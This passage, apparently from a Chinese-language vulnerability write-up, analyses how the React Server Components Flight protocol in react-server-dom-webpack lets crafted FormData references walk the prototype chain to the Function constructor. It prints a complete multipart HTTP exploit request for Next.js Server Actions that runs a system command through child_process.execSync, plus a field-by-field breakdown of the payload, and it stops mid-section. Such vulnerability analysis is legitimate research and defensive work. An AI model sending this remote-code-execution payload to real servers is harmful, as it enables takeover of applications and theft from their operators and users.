<span class="c1">//   2. 直接返回（不调用 initializeModelChunk）</span>
<span class="c1">// 结果:</span>
<span class="nx">ReactPromise</span> <span class="p">{</span>
    <span class="nl">status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">value</span><span class="p">:</span> <span class="dl">'</span><span class="s1">{"name": "Alice"}</span><span class="dl">'</span><span class="p">,</span>
    <span class="nx">reason</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="nx">_response</span><span class="p">:</span> <span class="nx">Response</span> <span class="p">{...},</span>
    <span class="nx">__proto__</span><span class="p">:</span> <span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span>  <span class="c1">// ⚠️ 可访问原型链！</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>安全影响</strong>: <code class="language-plaintext highlighter-rouge">$@</code> 让攻击者能获取内部 Chunk 对象，从而访问：</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Chunk.__proto__</code> → <code class="language-plaintext highlighter-rouge">ReactPromise.prototype</code></li>
  <li><code class="language-plaintext highlighter-rouge">Chunk.__proto__.then</code> → <code class="language-plaintext highlighter-rouge">ReactPromise.prototype.then</code> 方法</li>
  <li><code class="language-plaintext highlighter-rouge">Chunk.__proto__.constructor</code> → <code class="language-plaintext highlighter-rouge">Object</code> → <code class="language-plaintext highlighter-rouge">Function</code></li>
</ul>

<h3 id="35-关键函数详解"><span class="me-2">3.5 关键函数详解</span><a href="#35-关键函数详解" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="351-getchunk---获取或创建-chunk"><span class="me-2">3.5.1 getChunk - 获取或创建 Chunk</span><a href="#351-getchunk---获取或创建-chunk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">chunks</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">chunks</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>

    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Chunk 不存在，尝试从 FormData 获取</span>
        <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">;</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span> <span class="o">+</span> <span class="nx">id</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">data</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 创建 resolved_model 状态的 Chunk</span>
                <span class="nx">chunk</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReactPromise</span><span class="p">(</span>
                    <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span>  <span class="c1">// status</span>
                    <span class="nx">data</span><span class="p">,</span>              <span class="c1">// value (原始 JSON 字符串)</span>
                    <span class="nx">id</span><span class="p">,</span>                <span class="c1">// reason (这里存 id)</span>
                    <span class="nx">response</span>           <span class="c1">// response</span>
                <span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 创建 pending 状态的 Chunk</span>
            <span class="nx">chunk</span> <span class="o">=</span> <span class="nf">createPendingChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">chunks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">chunk</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">chunk</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>漏洞利用点</strong>: 攻击者通过 FormData 提供的数据会被直接用于创建 Chunk，<code class="language-plaintext highlighter-rouge">data</code> 参数完全可控。</p>

<h4 id="352-initializemodelchunk---解析-json-模型"><span class="me-2">3.5.2 initializeModelChunk - 解析 JSON 模型</span><a href="#352-initializemodelchunk---解析-json-模型" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">_response</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>  <span class="c1">// 原始 JSON 字符串</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="c1">// 解析 JSON，过程中处理 $ 引用</span>
        <span class="kd">var</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nf">parseModel</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>

        <span class="c1">// 更新 Chunk 状态</span>
        <span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">fulfilled</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">rejected</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span> <span class="o">=</span> <span class="nx">error</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>攻击利用</strong>: 攻击者可以构造特殊的 JSON，让 <code class="language-plaintext highlighter-rouge">parseModel</code> 执行危险操作。</p>

<h4 id="353-reactpromiseprototypethen---thenable-接口"><span class="me-2">3.5.3 ReactPromise.prototype.then - thenable 接口</span><a href="#353-reactpromiseprototypethen---thenable-接口" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">then</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>

    <span class="k">switch </span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="dl">"</span><span class="s2">fulfilled</span><span class="dl">"</span><span class="p">:</span>
            <span class="c1">// 已解析，直接返回值</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">resolve</span><span class="p">)</span> <span class="nf">resolve</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">pending</span><span class="dl">"</span><span class="p">:</span>
        <span class="k">case</span> <span class="dl">"</span><span class="s2">blocked</span><span class="dl">"</span><span class="p">:</span>
            <span class="c1">// 等待中，注册回调</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">resolve</span><span class="p">)</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">resolve</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">reject</span><span class="p">)</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">reject</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">:</span>
            <span class="c1">// ⚠️ 关键: 需要解析</span>
            <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">);</span>
            <span class="c1">// 解析后递归处理</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">fulfilled</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">resolve</span><span class="p">)</span> <span class="nf">resolve</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">rejected</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">reject</span><span class="p">)</span> <span class="nf">reject</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">rejected</span><span class="dl">"</span><span class="p">:</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">reject</span><span class="p">)</span> <span class="nf">reject</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>攻击利用</strong>: 当 <code class="language-plaintext highlighter-rouge">await</code> 一个 thenable 对象时，JavaScript 会调用其 <code class="language-plaintext highlighter-rouge">then</code> 方法。攻击者构造一个假 Chunk 对象，设置 <code class="language-plaintext highlighter-rouge">status: "resolved_model"</code> 和恶意 <code class="language-plaintext highlighter-rouge">value</code>，当被 <code class="language-plaintext highlighter-rouge">await</code> 时会触发 <code class="language-plaintext highlighter-rouge">initializeModelChunk</code>。</p>

<hr />

<h2 id="四漏洞根本原因深度分析"><span class="me-2">四、漏洞根本原因深度分析</span><a href="#四漏洞根本原因深度分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="41-漏洞位置"><span class="me-2">4.1 漏洞位置</span><a href="#41-漏洞位置" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>漏洞存在于 <code class="language-plaintext highlighter-rouge">react-server-dom-webpack</code> 包的 Flight 协议解析代码中，具体在处理链式属性引用时。</p>

<h3 id="42-漏洞代码分析"><span class="me-2">4.2 漏洞代码分析</span><a href="#42-漏洞代码分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="c1">// 简化的漏洞代码</span>
<span class="kd">function</span> <span class="nf">loadServerReference</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// path = "key1:key2:key3"</span>
    <span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>  <span class="c1">// 起始值</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
        <span class="c1">// ⚠️ 漏洞: 直接使用方括号访问</span>
        <span class="c1">// 没有检查 key 是否是对象自身属性</span>
        <span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="43-为什么缺少-hasownproperty-是危险的"><span class="me-2">4.3 为什么缺少 hasOwnProperty 是危险的</span><a href="#43-为什么缺少-hasownproperty-是危险的" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="431-javascript-原型链基础"><span class="me-2">4.3.1 JavaScript 原型链基础</span><a href="#431-javascript-原型链基础" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span> <span class="p">};</span>

<span class="c1">// 自身属性</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">name</span>                    <span class="c1">// "test"</span>
<span class="nx">obj</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">)</span>  <span class="c1">// true</span>

<span class="c1">// 继承属性（来自原型链）</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">toString</span>                <span class="c1">// [Function: toString]</span>
<span class="nx">obj</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="dl">"</span><span class="s2">toString</span><span class="dl">"</span><span class="p">)</span>  <span class="c1">// false ← 不是自身属性</span>

<span class="c1">// __proto__ 是特殊属性</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">__proto__</span>               <span class="c1">// Object.prototype</span>
<span class="nx">obj</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">)</span>  <span class="c1">// false</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="432-攻击者如何利用"><span class="me-2">4.3.2 攻击者如何利用</span><a href="#432-攻击者如何利用" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">// 正常访问</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">]</span>                 <span class="c1">// "test" ✓</span>

<span class="c1">// 攻击者输入 "__proto__"</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">]</span>            <span class="c1">// Object.prototype ← 访问到原型！</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">]</span>  <span class="c1">// Object</span>
<span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">]</span>  <span class="c1">// Function!</span>

<span class="c1">// 有 hasOwnProperty 检查时</span>
<span class="k">if </span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">obj</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">];</span>
<span class="p">}</span>
<span class="c1">// 不会执行，因为 __proto__ 不是自身属性</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="44-原型链攻击向量"><span class="me-2">4.4 原型链攻击向量</span><a href="#44-原型链攻击向量" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="441-获取-function-构造函数"><span class="me-2">4.4.1 获取 Function 构造函数</span><a href="#441-获取-function-构造函数" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">// 任意对象都可以通过原型链获取 Function</span>
<span class="kd">const</span> <span class="nx">anyObj</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">anyObj</span><span class="p">.</span><span class="nx">__proto__</span>                          <span class="c1">// Object.prototype</span>
      <span class="p">.</span><span class="kd">constructor</span>                        <span class="c1">// Object</span>
      <span class="p">.</span><span class="kd">constructor</span>                        <span class="c1">// Function ← 获得！</span>

<span class="c1">// 或者更直接</span>
<span class="nx">anyObj</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="kd">constructor</span>            <span class="c1">// Function</span>

<span class="c1">// 利用 Function 执行代码</span>
<span class="kd">const</span> <span class="nx">evil</span> <span class="o">=</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">return process.mainModule.require('child_process').execSync('id')</span><span class="dl">"</span><span class="p">);</span>
<span class="nf">evil</span><span class="p">();</span>  <span class="c1">// 执行系统命令</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="442-获取-chunkprototypethen"><span class="me-2">4.4.2 获取 Chunk.prototype.then</span><a href="#442-获取-chunkprototypethen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>这是漏洞利用的精妙之处：</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">// Chunk 1 的值设为 "$@0"（原始 Chunk 引用）</span>
<span class="c1">// 解析后，Chunk 1 的 value 是 Chunk 0 对象本身</span>

<span class="c1">// 当访问 "$1:__proto__:then" 时:</span>
<span class="kd">const</span> <span class="nx">chunk1Value</span> <span class="o">=</span> <span class="nf">parseModelString</span><span class="p">(</span><span class="dl">"</span><span class="s2">$@0</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// chunk1Value = ReactPromise { status, value, ... }</span>

<span class="nx">chunk1Value</span><span class="p">.</span><span class="nx">__proto__</span>              <span class="c1">// ReactPromise.prototype</span>
           <span class="p">.</span><span class="nx">then</span>                   <span class="c1">// ReactPromise.prototype.then 方法！</span>

<span class="c1">// 现在攻击者可以把这个方法赋给伪造对象的 then 属性</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="45-完整攻击原语"><span class="me-2">4.5 完整攻击原语</span><a href="#45-完整攻击原语" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>通过原型链，攻击者可以获取：</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>引用路径</th>
      <th>获得的值</th>
      <th>用途</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$1:__proto__:then</code></td>
      <td><code class="language-plaintext highlighter-rouge">Chunk.prototype.then</code></td>
      <td>让伪造对象成为合法 thenable</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$1:constructor:constructor</code></td>
      <td><code class="language-plaintext highlighter-rouge">Function</code></td>
      <td>动态创建并执行代码</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$1:__proto__:constructor</code></td>
      <td><code class="language-plaintext highlighter-rouge">Object</code></td>
      <td>获取 Object 构造函数</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$1:__proto__:constructor:prototype</code></td>
      <td><code class="language-plaintext highlighter-rouge">Object.prototype</code></td>
      <td>访问所有对象的原型</td>
    </tr>
  </tbody>
</table></div>

<hr />

<h2 id="五完整利用链详解"><span class="me-2">五、完整利用链详解</span><a href="#五完整利用链详解" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="51-攻击目标"><span class="me-2">5.1 攻击目标</span><a href="#51-攻击目标" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>攻击者的最终目标是在服务端执行任意代码。要实现这一目标，需要：</p>

<ol>
  <li><strong>获取 <code class="language-plaintext highlighter-rouge">Function</code> 构造函数</strong> - 用于动态创建可执行代码</li>
  <li><strong>找到一个”调用点”</strong> - 让创建的函数被执行</li>
  <li><strong>绑定恶意代码</strong> - 将要执行的命令传入 Function</li>
</ol>

<h3 id="52-攻击请求结构"><span class="me-2">5.2 攻击请求结构</span><a href="#52-攻击请求结构" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="521-完整-http-请求"><span class="me-2">5.2.1 完整 HTTP 请求</span><a href="#521-完整-http-请求" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-nextjs-app.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----FormBoundary</span>
<span class="na">Next-Action</span><span class="p">:</span> <span class="s">x</span>

------FormBoundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw new Error(require('child_process').execSync('id').toString());","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------FormBoundary
Content-Disposition: form-data; name="1"

"$@0"
------FormBoundary
Content-Disposition: form-data; name="2"

[]
------FormBoundary--
</pre></td></tr></tbody></table></code></div></div>

<h4 id="522-请求头分析"><span class="me-2">5.2.2 请求头分析</span><a href="#522-请求头分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Header</th>
      <th>值</th>
      <th>作用</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Content-Type</code></td>
      <td><code class="language-plaintext highlighter-rouge">multipart/form-data</code></td>
      <td>Flight 协议使用 FormData 传输</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Next-Action</code></td>
      <td><code class="language-plaintext highlighter-rouge">x</code></td>
      <td>任意值，触发 Server Action 处理流程</td>
    </tr>
  </tbody>
</table></div>

<p><strong>关键点</strong>: <code class="language-plaintext highlighter-rouge">Next-Action: x</code> 不是有效的 Action ID，但漏洞在验证 Action ID <strong>之前</strong>就触发了！</p>

<h3 id="53-payload-结构深度解析"><span class="me-2">5.3 Payload 结构深度解析</span><a href="#53-payload-结构深度解析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>攻击 payload 由 3 个 Chunk 组成，每个都有特定作用：</p>

<h4 id="531-chunk-0---伪造的-chunk-对象核心-payload"><span class="me-2">5.3.1 Chunk 0 - 伪造的 Chunk 对象（核心 Payload）</span><a href="#531-chunk-0---伪造的-chunk-对象核心-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="p">{</span>
    <span class="dl">"</span><span class="s2">then</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">$1:__proto__:then</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">status</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">reason</span><span class="dl">"</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">{</span><span class="se">\"</span><span class="s2">then</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">$B1337</span><span class="se">\"</span><span class="s2">}</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">_response</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">_prefix</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">throw new Error(require('child_process').execSync('id').toString());</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">_chunks</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">$Q2</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">_formData</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">$1:constructor:constructor</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>各字段详细解析</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
